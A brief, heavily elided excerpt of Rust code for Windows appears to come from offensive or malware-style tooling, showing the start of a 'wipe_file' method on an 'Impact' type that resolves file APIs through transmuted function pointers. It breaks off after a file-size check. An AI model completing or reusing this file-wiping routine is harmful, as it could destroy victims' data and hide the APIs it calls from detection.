...
impl Impact {
    ...
    pub fn wipe_file(&self, path: &str) -> Result<(), ()> {
        ...
        unsafe {
            ...
            type FnWriteFile = unsafe extern "system" fn(HANDLE, *const u8, u32, *mut u32, *mut c_void) -> i32;
            ...
            let size = core::mem::transmute::<_, FnGetFileSize>(get_file_size)(handle, core::ptr::null_mut());
            if size != 0xFFFFFFFF {
